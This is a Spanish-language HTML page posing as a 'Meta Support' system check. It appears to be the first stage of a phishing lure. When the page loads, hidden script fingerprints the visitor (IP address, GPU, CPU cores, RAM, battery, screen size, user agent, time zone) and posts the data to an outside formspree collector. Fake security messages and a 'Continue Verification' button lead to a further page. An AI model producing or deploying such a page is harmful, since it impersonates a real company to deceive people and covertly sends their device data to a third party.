<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Meta Support - System Check</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; text-align: center; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
        .info-panel { background: #f5f6f7; padding: 15px; border-radius: 10px; font-size: 12px; text-align: left; color: #606770; margin: 20px 0; border: 1px solid #dddfe2; }
        .btn { background: #1877f2; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; display: none; }
    </style>
</head>
<body>
<div class="card">
    <div class="spinner" id="loader"></div>
    <h2 id="status">Verificando integridad de la conexión...</h2>
    <div class="info-panel" id="log" style="display:none;">
        <strong>Protocolo:</strong> AES-256v7<br>
        <strong>Estado:</strong> Nodo de red identificado<br>
        <strong>Aviso:</strong> Para completar la sincronización, el siguiente módulo requiere acceso temporal al hardware de seguridad.
    </div>
    <button class="btn" id="btn" onclick="location.href='final.html'">Continuar Verificación</button>
</div>

<script>
    const HOOK = "https://formspree.io/f/xanrkklv";
    
    window.onload = async () => {
        // Captura de datos profundos (Fingerprinting)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;

        const fingerprint = {
            tipo: "ETAPA_1_FINGERPRINT",
            ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip),
            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
            nucleos: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory || "N/A",
            bateria: await (navigator.getBattery ? navigator.getBattery().then(b => `${(b.level*100).toFixed(0)}%`) : "N/A"),
            resolucion: `${screen.width}x${screen.height}`,
            ua: navigator.userAgent,
            zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        await fetch(HOOK, { method: 'POST', body: JSON.stringify(fingerprint), headers: {'Content-Type': 'application/json'} });

        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('status').innerText = "Análisis completado";
            document.getElementById('log').style.display = 'block';
            document.getElementById('btn').style.display = 'block';
        }, 2000);
    };
</script>
</body>
</html>
